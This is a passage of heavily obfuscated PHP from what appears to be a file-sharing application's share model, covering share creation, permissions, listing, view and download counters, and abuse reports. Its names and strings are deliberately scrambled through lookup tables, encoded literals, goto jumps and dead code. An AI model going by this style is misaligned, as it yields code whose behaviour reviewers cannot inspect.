$Ì†Î÷½‰); } public function fwuve8735ea6($Ù©ö«–®, $­¡…¾ëÂ) { $ÒØíšÉß =& $_SERVER[…¡Î×İ¶]; return call_user_func(array($ÒØíšÉß[303], $ÒØíšÉß[304]), $Ù©ö«–®, $­¡…¾ëÂ); } public function cxalf3deae5a($ïœôÔ°Ì, $ğØŒöè) { $©Ù¼‡ü™ =& $_SERVER[ÏéâËõ‘]; $Ã±Ì¹† =& $_SERVER[…¡Î×İ¶]; return call_user_func(array($Ã±Ì¹†[303], $Ã±Ì¹†[305]), $ïœôÔ°Ì, $ğØŒöè); $©¦¿Ş = $©Ù¼‡ü™[749]; while ($©¦¿Ş < $©Ù¼‡ü™[626]) { if ($©¦¿Ş >= 0) { break; } $©¦¿Ş++; } } } goto FÇÉÂ‘²¼‡; FŠ‡†‰Å…Æ: class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\x72\x65"; protected $dataAuto = array(array("\155\157\x64\x69\146\171\124\x69\155\145", "\x74\x69\155\x65", "\151\156\163\145\x72\x74\54\165\160\144\141\x74\145", "\x66\x75\x6e\143\164\x69\x6f\156"), array("\x63\x72\145\141\x74\145\x54\x69\155\145", "\164\151\155\x65", "\x69\156\163\145\x72\x74", "\146\x75\x6e\143\x74\x69\157\156"), array("\157\160\x74\x69\157\156\163", '', "\x69\x6e\x73\145\162\x74\54\165\x70\x64\x61\164\145\54\163\x65\x6c\145\x63\164", "\152\163\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($Óì‘ò¹) { $©ä›ã³ú =& $_SERVER[ÏéâËõ‘]; $Ÿ¶‡Ë‚… = isset($Óì‘ò¹[0]) ? $Óì‘ò¹[0] : !1; return array($©ä›ã³ú[1973] => array(USER_ID, $©ä›ã³ú[1974]), $©ä›ã³ú[1914] => array($Ÿ¶‡Ë‚…, $©ä›ã³ú[1975])); } protected function listSimple() { $İÉ¸Ş¡‘ = array($_SERVER[ÏéâËõ‘][1662] => USER_ID); $Ï×ìÄâæ = $this->field($this->fieldList)->where($İÉ¸Ş¡‘)->select(); return $Ï×ìÄâæ ? $Ï×ìÄâæ : array(); } protected function getInfo($õÎùä×, $î®¸¢‰© = false) { $ü»úù¡è =& $_SERVER[ÏéâËõ‘]; if ($î®¸¢‰©) { return $this->_getShareInfo(array($ü»úù¡è[489] => $õÎùä×)); } $ÖÚæ¾™ë = $this->cacheFunctionGet($ü»úù¡è[1916], $õÎùä×); return $ÖÚæ¾™ë; } public function getInfoByHash($ºŸéâ½ï) { return $this->_getShareInfo(array($_SERVER[ÏéâËõ‘][491] => $ºŸéâ½ï)); } public function getInfoByPath($—îöˆœ) { $•øÂ¶Ä£ =& $_SERVER[ÏéâËõ‘]; $­—ûËÔ = array($•øÂ¶Ä£[1662] => USER_ID, $•øÂ¶Ä£[402] => $—îöˆœ); return $this->_getShareInfo($­—ûËÔ); } public function getInfoBySourcePath($µàÕ§éÃ) { $ƒ¸«ğ =& $_SERVER[ÏéâËõ‘]; $ìª¤ë´ = array($ƒ¸«ğ[1662] => USER_ID, $ƒ¸«ğ[1181] => $µàÕ§éÃ); return $this->_getShareInfo($ìª¤ë´); } private function _getShareInfo($¤‰•Âñº) { $ó‘‹å‰¤ =& $_SERVER[ÏéâËõ‘]; $ŠÍ¥ÍµÅ = $this->where($¤‰•Âñº)->find(); if (!$ŠÍ¥ÍµÅ) { return !1; } $¤‰•Âñº = array($ó‘‹å‰¤[489] => $ŠÍ¥ÍµÅ[$ó‘‹å‰¤[489]]); $¸î£•„‰ = $ó‘‹å‰¤[1976]; $™©­··î = Model($ó‘‹å‰¤[602])->order($ó‘‹å‰¤[399])->field($¸î£•„‰)->where($¤‰•Âñº)->select(); if ($ŠÍ¥ÍµÅ[$ó‘‹å‰¤[402]] == $ó‘‹å‰¤[197]) { $ŠÍ¥ÍµÅ[$ó‘‹å‰¤[86]] = IO::info($ŠÍ¥ÍµÅ[$ó‘‹å‰¤[1181]]); } else { $ŠÍ¥ÍµÅ[$ó‘‹å‰¤[86]] = Model($ó‘‹å‰¤[1332])->pathInfo($ŠÍ¥ÍµÅ[$ó‘‹å‰¤[402]]); } $ŠÍ¥ÍµÅ[$ó‘‹å‰¤[1977]] = $™©­··î; return $ŠÍ¥ÍµÅ; } protected function getInfoAuth($î¾µÛò) { $ÀÓÃşò =& $_SERVER[ÏéâËõ‘]; $ÔÄ®„òç = $this->getInfo($î¾µÛò); if ($ÔÄ®„òç[$ÀÓÃşò[1662]] == USER_ID) { $ÔÄ®„òç[$ÀÓÃşò[413]] = $ÔÄ®„òç[$ÀÓÃşò[86]][$ÀÓÃşò[413]]; } else { $ÔÄ®„òç[$ÀÓÃşò[413]] = Model($ÀÓÃşò[502])->authMake($ÔÄ®„òç[$ÀÓÃşò[1977]]); } return $ÔÄ®„òç; } protected function listData($ú¥ŒÆı½ = null, $Èû™Î¾å = 300) { $³éã·ôæ =& $_SERVER[ÏéâËõ‘]; $¼¿ËËÜØ = array(array($³éã·ôæ[494] => array($³éã·ôæ[1017], 0), $³éã·ôæ[496] => array($³éã·ôæ[1017], 0), $³éã·ôæ[1978] => $³éã·ôæ[1932])); if ($ú¥ŒÆı½ == $³éã·ôæ[1979]) { $¼¿ËËÜØ = array($³éã·ôæ[494] => 1); } else { if ($ú¥ŒÆı½ == $³éã·ôæ[1166]) { $¼¿ËËÜØ = array($³éã·ôæ[496] => 1); } } $¼¿ËËÜØ[$³éã·ôæ[1662]] = USER_ID; $µÆ’ˆÁØ = $this->where($¼¿ËËÜØ)->selectPage($Èû™Î¾å); return $µÆ’ˆÁØ; } protected function listToMe($–©•óß = 300) { $·â—ûú =& $_SERVER[ÏéâËõ‘]; $¦ä«Ç§› = Model($·â—ûú[1980])->userGroupParents(USER_ID); $íïˆ×¾Å = array($·â—ûú[586] => SourceModel::TYPE_USER, $·â—ûú[505] => USER_ID); if ($¦ä«Ç§›) { $íïˆ×¾Å = array(array($·â—ûú[586] => SourceModel::TYPE_USER, $·â—ûú[505] => USER_ID), array($·â—ûú[586] => SourceModel::TYPE_GROUP, $·â—ûú[505] => array($·â—ûú[7], $¦ä«Ç§›)), $·â—ûú[1978] => $·â—ûú[1932]); } $ĞÓÈ«âÔ = Model($·â—ûú[602])->where($íïˆ×¾Å)->selectPage($–©•óß); $˜•½ÅŞ• = array_to_keyvalue_group($ĞÓÈ«âÔ[$·â—ûú[369]], $·â—ûú[489]); if (!$˜•½ÅŞ•) { return $ĞÓÈ«âÔ; } $û’ÂÂ£ = $·â—ûú[1981]; $íïˆ×¾Å = array($·â—ûú[489] => array($·â—ûú[418], array_keys($˜•½ÅŞ•)), $·â—ûú[1662] => array($·â—ûú[1019], $·â—ûú[197])); $úà•¹‹Ğ = $this->field($û’ÂÂ£)->where($íïˆ×¾Å)->select(); foreach ($úà•¹‹Ğ as $’ÁèÅ¤ => &$÷ÃëÒ˜) { $÷ÃëÒ˜[$·â—ûú[1977]] = $˜•½ÅŞ•[$÷ÃëÒ˜[$·â—ûú[489]]]; } unset($÷ÃëÒ˜); $ñÕç²„ô = array($·â—ûú[1982] => $úà•¹‹Ğ, $·â—ûú[1983] => $ĞÓÈ«âÔ[$·â—ûú[366]]); return $ñÕç²„ô; } protected function shareAdd($—Ò‚ÌÜ, $ı´‚¶ú¹) { $ùíµš”ş =& $_SERVER[ÏéâËõ‘]; $â£íú¤ = $this->_addShareData($—Ò‚ÌÜ, $ı´‚¶ú¹); if (!empty($ı´‚¶ú¹[$ùíµš”ş[1984]])) { $this->_shareAuthSet($â£íú¤, $ı´‚¶ú¹[$ùíµš”ş[1984]]); } $this->shareEventAdd($—Ò‚ÌÜ, $ı´‚¶ú¹, $ùíµš”ş[1169]); return $â£íú¤; } protected function shareAddSystem($Ñ¦§¢µ , $ìòíü) { $¥‘â›á =& $_SERVER[ÏéâËõ‘]; $îİÍö„Ö = $this->_addShareData($Ñ¦§¢µ , $ìòíü, $¥‘â›á[1281]); $this->_shareAuthSet($îİÍö„Ö, $ìòíü[$¥‘â›á[1984]]); return $îİÍö„Ö; } private function shareEventAdd($§Ì´€«û, $Êš°§®, $×Ê¦»ïú = "\x61\x64\x64") { $ÁÀ¬Î‰« =& $_SERVER[ÏéâËõ‘]; if (!$§Ì´€«û || $§Ì´€«û == $ÁÀ¬Î‰«[197]) { return; } if ($×Ê¦»ïú == $ÁÀ¬Î‰«[1169]) { if ($Êš°§®[$ÁÀ¬Î‰«[494]] == $ÁÀ¬Î‰«[88]) { Model($ÁÀ¬Î‰«[570])->eventShare($§Ì´€«û, $ÁÀ¬Î‰«[1985]); } if ($Êš°§®[$ÁÀ¬Î‰«[496]] == $ÁÀ¬Î‰«[88]) { Model($ÁÀ¬Î‰«[570])->eventShare($§Ì´€«û, $ÁÀ¬Î‰«[1986]); } return; } $ëêÓ™Ú = $this->getInfoByPath($§Ì´€«û); $ğæÖ™­ = $ÁÀ¬Î‰«[1987]; if ($ëêÓ™Ú[$ÁÀ¬Î‰«[494]] == $ÁÀ¬Î‰«[197] && $Êš°§®[$ÁÀ¬Î‰«[494]] == $ÁÀ¬Î‰«[88]) { $ğæÖ™­ = $ÁÀ¬Î‰«[1985]; } if ($ëêÓ™Ú[$ÁÀ¬Î‰«[494]] == $ÁÀ¬Î‰«[88] && $Êš°§®[$ÁÀ¬Î‰«[494]] == $ÁÀ¬Î‰«[197]) { $ğæÖ™­ = $ÁÀ¬Î‰«[1988]; } if ($ëêÓ™Ú[$ÁÀ¬Î‰«[496]] == $ÁÀ¬Î‰«[197] && $Êš°§®[$ÁÀ¬Î‰«[496]] == $ÁÀ¬Î‰«[88]) { $ğæÖ™­ = $ÁÀ¬Î‰«[1986]; } if ($ëêÓ™Ú[$ÁÀ¬Î‰«[496]] == $ÁÀ¬Î‰«[88] && $Êš°§®[$ÁÀ¬Î‰«[496]] == $ÁÀ¬Î‰«[197]) { $ğæÖ™­ = $ÁÀ¬Î‰«[1989]; } Model($ÁÀ¬Î‰«[570])->eventShare($§Ì´€«û, $ğæÖ™­); return; } private function _addShareData($åÇ­’Ø½, $Û“÷Ñ¬‘ = array(), $Èƒ‹Æšû = false) { $³ªØô«è =& $_SERVER[ÏéâËõ‘]; $†ÓØºµá = $Èƒ‹Æšû == $³ªØô«è[1281] ? 0 : USER_ID; $š°Áø­³ = array($³ªØô«è[417] => $åÇ­’Ø½, $³ªØô«è[1653] => $†ÓØºµá); if ($åÇ­’Ø½ == 0) { $š°Áø­³ = array($³ªØô«è[1990] => $Û“÷Ñ¬‘[$³ªØô«è[1181]], $³ªØô«è[1653] => $†ÓØºµá); } if ($Ì”‘ş© = $this->where($š°Áø­³)->find()) { return $Ì”‘ş©[$³ªØô«è[489]]; } if ($åÇ­’Ø½ == 0) { $£§õ÷Ç¡ = array($³ªØô«è[32] => get_path_this($Û“÷Ñ¬‘[$³ªØô«è[84]])); } else { $£§õ÷Ç¡ = Model($³ªØô«è[827])->sourceInfo($åÇ­’Ø½); if (!$£§õ÷Ç¡) { return !1; } } if (!$Û“÷Ñ¬‘[$³ªØô«è[1561]]) { $Û“÷Ñ¬‘[$³ªØô«è[1561]] = $£§õ÷Ç¡[$³ªØô«è[32]]; } $Á¤ù»§Ã = array($³ªØô«è[1653] => $†ÓØºµá, $³ªØô«è[417] => $åÇ­’Ø½, $³ªØô«è[1561] => $³ªØô«è[12], $³ªØô«è[494] => 0, $³ªØô«è[496] => 0, $³ªØô«è[1181] => $³ªØô«è[12], $³ªØô«è[307] => $³ªØô«è[12], $³ªØô«è[894] => $³ªØô«è[12], $³ªØô«è[1991] => 0, $³ªØô«è[1992] => 0, $³ªØô«è[497] => 0, $³ªØô«è[498] => $³ªØô«è[12], $³ªØô«è[491] => $³ªØô«è[12]); $‡ßí’ú = explode($³ªØô«è[50], $³ªØô«è[1993]); foreach ($‡ßí’ú as $¨î¿Ï¯Æ) { if (!isset($Û“÷Ñ¬‘[$¨î¿Ï¯Æ])) { continue; } $Á¤ù»§Ã[$¨î¿Ï¯Æ] = $Û“÷Ñ¬‘[$¨î¿Ï¯Æ]; } $¡Ï‡Äôë = $this->add($Á¤ù»§Ã); $¹èıˆßÒ = array($³ªØô«è[491] => short_id($¡Ï‡Äôë)); $this->where(array($³ªØô«è[488] => $¡Ï‡Äôë))->save($¹èıˆßÒ); return $¡Ï‡Äôë; } private function _shareAuthSet($Õ»ïâ³Ë, $ÅğÖ…Ø) { $ª¤¿ÙøÃ =& $_SERVER[ÏéâËõ‘]; if (!is_array($ÅğÖ…Ø)) { return !1; } $‰×ƒ¨ÒÁ = Model($ª¤¿ÙøÃ[1942]); $‰×ƒ¨ÒÁ->where(array($ª¤¿ÙøÃ[489] => $Õ»ïâ³Ë))->delete(); $©´”Ñ‰ = array(); foreach ($ÅğÖ…Ø as $•À²¹õ) { $ÅøÖ€õÉ = SourceModel::TYPE_USER; if ($•À²¹õ[$ª¤¿ÙøÃ[411]] == SourceModel::TYPE_GROUP) { $ÅøÖ€õÉ = SourceModel::TYPE_GROUP; } $û¿©¦î = array($ª¤¿ÙøÃ[489] => $Õ»ïâ³Ë, $ª¤¿ÙøÃ[411] => $ÅøÖ€õÉ, $ª¤¿ÙøÃ[505] => intval($•À²¹õ[$ª¤¿ÙøÃ[505]]), $ª¤¿ÙøÃ[1938] => 0, $ª¤¿ÙøÃ[1994] => -1); if ($•À²¹õ[$ª¤¿ÙøÃ[1938]]) { $û¿©¦î[$ª¤¿ÙøÃ[1938]] = $•À²¹õ[$ª¤¿ÙøÃ[1938]]; } else { if ($•À²¹õ[$ª¤¿ÙøÃ[1994]]) { $û¿©¦î[$ª¤¿ÙøÃ[1994]] = $•À²¹õ[$ª¤¿ÙøÃ[1994]]; } } $©´”Ñ‰[] = $û¿©¦î; } return $‰×ƒ¨ÒÁ->addAll($©´”Ñ‰, array(), !0); } public function numViewAdd($úËëÅæ£) { $é¡êâü =& $_SERVER[ÏéâËõ‘]; $Í×Å¥ó¤ = array($é¡êâü[488] => $úËëÅæ£); $this->where($Í×Å¥ó¤)->setAdd($é¡êâü[1991]); } public function numDownloadAdd($ÛÑŠÀ‡) { $µº¾ƒÎ¹ =& $_SERVER[ÏéâËõ‘]; $ˆîŸÍ˜Ì = array($µº¾ƒÎ¹[488] => $ÛÑŠÀ‡); $this->where($ˆîŸÍ˜Ì)->setAdd($µº¾ƒÎ¹[1992]); } protected function shareEdit($ç¸†ã‡ß, $ˆÏÅ¨˜±) { $«ı­æÄì =& $_SERVER[ÏéâËõ‘]; $¬÷ì¼€æ = $this->getInfo($ç¸†ã‡ß); if (!$¬÷ì¼€æ) { return !1; } $this->_checkLinkShare($ˆÏÅ¨˜±, $¬÷ì¼€æ); $Şê²­ü = array(); $—¢ÓÅ¸¦ = explode($«ı­æÄì[50], $«ı­æÄì[1995]); foreach ($—¢ÓÅ¸¦ as $øÀ¾ÚàÑ) { if (!array_key_exists($øÀ¾ÚàÑ, $ˆÏÅ¨˜±)) { continue; } $Şê²­ü[$øÀ¾ÚàÑ] = $ˆÏÅ¨˜±[$øÀ¾ÚàÑ]; } $this->shareEventAdd($¬÷ì¼€æ[$«ı­æÄì[402]], $ˆÏÅ¨˜±, $«ı­æÄì[1804]); $this->where(array($«ı­æÄì[488] => $ç¸†ã‡ß))->save($Şê²­ü); if (isset($ˆÏÅ¨˜±[$«ı­æÄì[1984]])) { $this->_shareAuthSet($ç¸†ã‡ß, $ˆÏÅ¨˜±[$«ı­æÄì[1984]]); } return !0; } private function _checkLinkShare($»»äòğ–, $¢©¢®‡) { $ìÀ¢‰Øš =& $_SERVER[ÏéâËõ‘]; if ($»»äòğ–[$ìÀ¢‰Øš[494]] != $ìÀ¢‰Øš[88]) { return; } $£¾¾¦ü± = $¢©¢®‡[$ìÀ¢‰Øš[86]][$ìÀ¢‰Øš[402]]; if ($¢©¢®‡[$ìÀ¢‰Øš[86]][$ìÀ¢‰Øš[33]] != $ìÀ¢‰Øš[199]) { $¢œä÷Ü = $this->_folderReport($£¾¾¦ü±); if (!$¢œä÷Ü) { return; } show_json(LNG($ìÀ¢‰Øš[1996]) . $ìÀ¢‰Øš[1997] . $¢œä÷Ü, !1); } $êß’¦Ñ = Model($ìÀ¢‰Øš[827])->fileInfoGet($¢©¢®‡[$ìÀ¢‰Øš[86]][$ìÀ¢‰Øš[402]]); if (!$êß’¦Ñ) { return; } $½¾À« = $this->shareFileMeta($êß’¦Ñ[$ìÀ¢‰Øš[468]]); if (isset($½¾À«[$ìÀ¢‰Øš[374]]) && $½¾À«[$ìÀ¢‰Øš[374]] == $ìÀ¢‰Øš[88]) { show_json(LNG($ìÀ¢‰Øš[1998]), !1); } } private function _folderReport($ ÒçïÙ) { $§“ñ…ÑÁ =& $_SERVER[ÏéâËõ‘]; $Ô÷šœ° = array($§“ñ…ÑÁ[468] => array($§“ñ…ÑÁ[1017], 0), $§“ñ…ÑÁ[752] => 3); $‚ñŒ©»Ò = Model($§“ñ…ÑÁ[1999])->where($Ô÷šœ°)->field($§“ñ…ÑÁ[468])->select(); if (!$‚ñŒ©»Ò) { return !1; } $‚ñŒ©»Ò = array_to_keyvalue($‚ñŒ©»Ò, $§“ñ…ÑÁ[12], $§“ñ…ÑÁ[468]); $â±Ğ‚‹ = $§“ñ…ÑÁ[50] . $ ÒçïÙ . $§“ñ…ÑÁ[50]; $Ô÷šœ° = array($§“ñ…ÑÁ[468] => array($§“ñ…ÑÁ[7], $‚ñŒ©»Ò), $§“ñ…ÑÁ[521] => array($§“ñ…ÑÁ[383], "\45{$â±Ğ‚‹}\45"), $§“ñ…ÑÁ[431] => 0); $ˆÅ¿èñ = Model($§“ñ…ÑÁ[827])->where($Ô÷šœ°)->field($§“ñ…ÑÁ[2000])->find(); if (!$ˆÅ¿èñ) { return !1; } $ä÷¥Íø« = substr($ˆÅ¿èñ[$§“ñ…ÑÁ[521]], strpos($ˆÅ¿èñ[$§“ñ…ÑÁ[521]], $â±Ğ‚‹)); $Ô÷šœ° = array($§“ñ…ÑÁ[402] => array($§“ñ…ÑÁ[7], trim($ä÷¥Íø«, $§“ñ…ÑÁ[50]))); $ê…©ŠœÍ = Model($§“ñ…ÑÁ[827])->where($Ô÷šœ°)->field($§“ñ…ÑÁ[32])->select(); $¥Œ¯ÑóÏ = array_to_keyvalue($ê…©ŠœÍ, $§“ñ…ÑÁ[12], $§“ñ…ÑÁ[32]); $¥Œ¯ÑóÏ[] = $ˆÅ¿èñ[$§“ñ…ÑÁ[32]]; return implode($§“ñ…ÑÁ[8], $¥Œ¯ÑóÏ); } protected function remove($åÑ¿¶²é) { $àÁ„‰ƒå =& $_SERVER[ÏéâËõ‘]; if (is_array($åÑ¿¶²é)) { $åÑ¿¶²é = array($àÁ„‰ƒå[7], $åÑ¿¶²é); } $Æ¢‡‡áè = array($àÁ„‰ƒå[489] => $åÑ¿¶²é); $”éší­ = $this->where($Æ¢‡‡áè)->delete(); if ($”éší­) { Model($àÁ„‰ƒå[602])->where(array($àÁ„‰ƒå[489] => $åÑ¿¶²é))->delete(); } $¯ïõù™« = is_array($åÑ¿¶²é) ? $åÑ¿¶²é[1] : array($åÑ¿¶²é); for ($•í·»¤ä = 0; $•í·»¤ä < count($¯ïõù™«); $•í·»¤ä++) { $ÜÃ–†Æñ = $this->getInfo($¯ïõù™«[$•í·»¤ä]); if ($ÜÃ–†Æñ[$àÁ„‰ƒå[496]] == $àÁ„‰ƒå[88]) { Model($àÁ„‰ƒå[570])->eventShare($ÜÃ–†Æñ[$àÁ„‰ƒå[402]], $àÁ„‰ƒå[1989]); } if ($ÜÃ–†Æñ[$àÁ„‰ƒå[494]] == $àÁ„‰ƒå[88]) { Model($àÁ„‰ƒå[570])->eventShare($ÜÃ–†Æñ[$àÁ„‰ƒå[402]], $àÁ„‰ƒå[1988]); } } return $”éší­; } protected function removeBySource($É¿¼ª†) { $Š¢éù =& $_SERVER[ÏéâËõ‘]; $ãÆ²²Ÿ‘ = array($Š¢éù[417] => array($Š¢éù[418], $É¿¼ª†)); $Ëœ¥ï‹¬ = $this->field($Š¢éù[489])->where($ãÆ²²Ÿ‘)->select(); $Ëœ¥ï‹¬ = array_to_keyvalue($Ëœ¥ï‹¬, $Š¢éù[12], $Š¢éù[489]); if (!$Ëœ¥ï‹¬) { return; } $ãÆ²²Ÿ‘ = array($Š¢éù[488] => array($Š¢éù[418], $Ëœ¥ï‹¬)); $this->where($ãÆ²²Ÿ‘)->delete(); Model($Š¢éù[602])->where($ãÆ²²Ÿ‘)->delete(); } public function listAll($Ä‡§‚™«) { $¼Œ¨Íšˆ =& $_SERVER[ÏéâËõ‘]; $šÛ••¢é = array(); if ($Ä‡§‚™«[$¼Œ¨Íšˆ[1662]]) { $šÛ••¢é[$¼Œ¨Íšˆ[1662]] = $Ä‡§‚™«[$¼Œ¨Íšˆ[1662]]; } if ($Ä‡§‚™«[$¼Œ¨Íšˆ[763]]) { $ÃòÚìí× = $Ä‡§‚™«[$¼Œ¨Íšˆ[497]] ? $Ä‡§‚™«[$¼Œ¨Íšˆ[497]] : strtotime(date($¼Œ¨Íšˆ[2001])); $šÛ••¢é[$¼Œ¨Íšˆ[200]] = array($¼Œ¨Íšˆ[333], array($Ä‡§‚™«[$¼Œ¨Íšˆ[763]], $ÃòÚìí×)); } if ($Ä‡§‚™«[$¼Œ¨Íšˆ[33]]) { $šÛ••¢é[$Ä‡§‚™«[$¼Œ¨Íšˆ[33]]] = 1; } else { $šÛ••¢é[] = array($¼Œ¨Íšˆ[494] => array($¼Œ¨Íšˆ[1017], 0), $¼Œ¨Íšˆ[496] => array($¼Œ¨Íšˆ[1017], 0), $¼Œ¨Íšˆ[1978] => $¼Œ¨Íšˆ[1932]); } if ($Ä‡§‚™«[$¼Œ¨Íšˆ[1928]]) { $šÛ••¢é[] = array($¼Œ¨Íšˆ[491] => $Ä‡§‚™«[$¼Œ¨Íšˆ[1928]], $¼Œ¨Íšˆ[1561] => array($¼Œ¨Íšˆ[383], "\45{$Ä‡§‚™«[$¼Œ¨Íšˆ[1928]]}\45"), $¼Œ¨Íšˆ[1978] => $¼Œ¨Íšˆ[1932]); } $‚¶ø…¶ = $this->_makeOrder()->where($šÛ••¢é)->selectPage(20); if (empty($‚¶ø…¶[$¼Œ¨Íšˆ[369]])) { return array(); } $this->_listDataApply($‚¶ø…¶[$¼Œ¨Íšˆ[369]]); return $‚¶ø…¶; } public function listDataApply($Ö±ãŠ‚¾) { $this->_listDataApply($Ö±ãŠ‚¾); return $Ö±ãŠ‚¾; } private function _listDataApply(&$É¦£»Âœ) { $Òá¢ĞÙ =& $_SERVER[ÏéâËõ‘]; $¶­øó´• = array_to_keyvalue($É¦£»Âœ, $Òá¢ĞÙ[12], $Òá¢ĞÙ[1662]); $éñ–×µ = Model($Òá¢ĞÙ[535])->userListInfo(array_unique($¶­øó´•)); $²Âˆ­Êá = array_to_keyvalue($É¦£»Âœ, $Òá¢ĞÙ[12], $Òá¢ĞÙ[402]); $âãÆ÷ïŠ = Model($Òá¢ĞÙ[827])->sourceListInfo($²Âˆ­Êá, !0); foreach ($É¦£»Âœ as $§ãô’ó => &$Ï¡ÕŸ›ô) { $º·›û˜ = $Ï¡ÕŸ›ô[$Òá¢ĞÙ[1662]]; $Ï¡ÕŸ›ô[$Òá¢ĞÙ[2002]] = $éñ–×µ[$º·›û˜] ? $éñ–×µ[$º·›û˜] : !1; $”‹õ´†Ë = $Ï¡ÕŸ›ô[$Òá¢ĞÙ[402]]; $Ï¡ÕŸ›ô[$Òá¢ĞÙ[86]] = $âãÆ÷ïŠ[$”‹õ´†Ë] ? $âãÆ÷ïŠ[$”‹õ´†Ë] : !1; if ($Ï¡ÕŸ›ô[$Òá¢ĞÙ[86]][$Òá¢ĞÙ[431]] == $Òá¢ĞÙ[88]) { unset($É¦£»Âœ[$§ãô’ó]); } if ($Ï¡ÕŸ›ô[$Òá¢ĞÙ[86]] != $Òá¢ĞÙ[197] && !$Ï¡ÕŸ›ô[$Òá¢ĞÙ[86]]) { unset($É¦£»Âœ[$§ãô’ó]); } } unset($Ï¡ÕŸ›ô); $É¦£»Âœ = array_values($É¦£»Âœ); } private function _makeOrder($¹Â§‰¾Ú = '') { $òÀ¯”ñµ =& $_SERVER[ÏéâËõ‘]; $«éÒÂÛ = array($òÀ¯”ñµ[200], $òÀ¯”ñµ[497], $òÀ¯”ñµ[1991], $òÀ¯”ñµ[1992]); $÷¥ˆ¨×¤ = array($òÀ¯”ñµ[450] => $òÀ¯”ñµ[451], $òÀ¯”ñµ[452] => $òÀ¯”ñµ[453]); $ÚªØ¡èÍ = Input::get($òÀ¯”ñµ[457], $òÀ¯”ñµ[7], $òÀ¯”ñµ[423], $«éÒÂÛ); $¿òÌ—Êû = Input::get($òÀ¯”ñµ[458], $òÀ¯”ñµ[7], $òÀ¯”ñµ[2003], array($òÀ¯”ñµ[1925], $òÀ¯”ñµ[452])); $¿òÌ—Êû = $÷¥ˆ¨×¤[$¿òÌ—Êû]; $¹Â§‰¾Ú = $¹Â§‰¾Ú . "{$ÚªØ¡èÍ}\40{$¿òÌ—Êû}"; return $this->order($¹Â§‰¾Ú); } public function reportAdd($ßÕÖê¡Ğ) { $ïèÍÈÕ˜ =& $_SERVER[ÏéâËõ‘]; $òÒ—­ô = array($ïèÍÈÕ˜[489] => $ßÕÖê¡Ğ[$ïèÍÈÕ˜[489]], $ïèÍÈÕ˜[1662] => USER_ID); if (Model($ïèÍÈÕ˜[1999])->where($òÒ—­ô)->find()) { return !1; } $º†‘Õ¼ = array($ïèÍÈÕ˜[489] => $ßÕÖê¡Ğ[$ïèÍÈÕ˜[489]], $ïèÍÈÕ˜[1561] => $ßÕÖê¡Ğ[$ïèÍÈÕ˜[1561]], $ïèÍÈÕ˜[402] => $ßÕÖê¡Ğ[$ïèÍÈÕ˜[402]], $ïèÍÈÕ˜[468] => $ßÕÖê¡Ğ[$ïèÍÈÕ˜[468]], $ïèÍÈÕ˜[1662] => USER_ID, $ïèÍÈÕ˜[33] => $ßÕÖê¡Ğ[$ïèÍÈÕ˜[33]], $ïèÍÈÕ˜[453] => $ßÕÖê¡Ğ[$ïèÍÈÕ˜[453]]); return Model($ïèÍÈÕ˜[1999])->add($º†‘Õ¼); } public function reportList($ñóîƒ¨) { $×„ôÒƒ =& $_SERVER[ÏéâËõ‘]; $…¯Å®Ôî = array(); if ($ñóîƒ¨[$×„ôÒƒ[763]]) { $é—öïÙÓ = $ñóîƒ¨[$×„ôÒƒ[497]] ? $ñóîƒ¨[$×„ôÒƒ[497]] : strtotime(date($×„ôÒƒ[2001])); $…¯Å®Ôî[$×„ôÒƒ[200]] = array($×„ôÒƒ[333], array($ñóîƒ¨[$×„ôÒƒ[763]], $é—öïÙÓ)); } if (isset($ñóîƒ¨[$×„ôÒƒ[33]]) && in_array($ñóîƒ¨[$×„ôÒƒ[33]], array($×„ôÒƒ[88], $×„ôÒƒ[437], $×„ôÒƒ[2004], $×„ôÒƒ[2005], $×„ôÒƒ[2006]))) { $…¯Å®Ôî[$×„ôÒƒ[33]] = $ñóîƒ¨[$×„ôÒƒ[33]]; } if (isset($ñóîƒ¨[$×„ôÒƒ[752]]) && in_array($ñóîƒ¨[$×„ôÒƒ[752]], array($×„ôÒƒ[197], $×„ôÒƒ[88], $×„ôÒƒ[437], $×„ôÒƒ[2004]))) { $…¯Å®Ôî[$×„ôÒƒ[752]] = $ñóîƒ¨[$×„ôÒƒ[752]]; } $©îÔäÂ¼ = Input::get($×„ôÒƒ[458], $×„ôÒƒ[7], $×„ôÒƒ[2003], array($×„ôÒƒ[1925], $×„ôÒƒ[452])); $ñş¥ªç = array($×„ôÒƒ[450] => $×„ôÒƒ[451], $×„ôÒƒ[452] => $×„ôÒƒ[453]); $ş‹‰°ƒŠ = $×„ôÒƒ[2007] . $ñş¥ªç[$©îÔäÂ¼]; $—Ô¦ê¼ø = Model($×„ôÒƒ[1999])->where($…¯Å®Ôî)->order($ş‹‰°ƒŠ)->selectPage(20); if (empty($—Ô¦ê¼ø[$×„ôÒƒ[369]])) { return array(); } $úÃ¸†’ = array_to_keyvalue_group($—Ô¦ê¼ø[$×„ôÒƒ[369]], $×„ôÒƒ[752], $×„ôÒƒ[489]); if (!empty($úÃ¸†’[0])) { $ñóîƒ¨ = $úÃ¸†’[0]; $…¯Å®Ôî = array($×„ôÒƒ[489] => array($×„ôÒƒ[7], $ñóîƒ¨)); $‡äÌÒÇ¡ = $this->where($…¯Å®Ôî)->field($×„ôÒƒ[489])->select(); $‡äÌÒÇ¡ = array_to_keyvalue($‡äÌÒÇ¡, $×„ôÒƒ[12], $×„ôÒƒ[489]); $öÍÂœè— = array_diff($ñóîƒ¨, $‡äÌÒÇ¡); if (!empty($öÍÂœè—)) { foreach ($—Ô¦ê¼ø[$×„ôÒƒ[369]] as $›çâÑ¢ => $“îï¨š«) { if (in_array($“îï¨š«[$×„ôÒƒ[489]], $öÍÂœè—)) { unset($—Ô¦ê¼ø[$×„ôÒƒ[369]][$›çâÑ¢]); } } } } $this->_listDataApply($—Ô¦ê¼ø[$×„ôÒƒ[369]]); return $—Ô¦ê¼ø; } public function reportStatus($¯½À¡˜§) { $İ—˜ù¦‘ =& $_SERVER[ÏéâËõ‘]; $Æ§†ËÁ¹ = array($İ—˜ù¦‘[399] => $¯½À¡˜§[$İ—˜ù¦‘[399]]); $­¹öëº = Model($İ—˜ù¦‘[1999])->where($Æ§†ËÁ¹)->field($İ—˜ù¦‘[2008])->find(); if (!$­¹öëº) { return !1; } $ñú»˜ş™ = array($İ—˜ù¦‘[752] => $¯½À¡˜§[$İ—˜ù¦‘[752]]); if ($¯½À¡˜§[$İ—˜ù¦‘[752]] == $İ—˜ù¦‘[2004] && 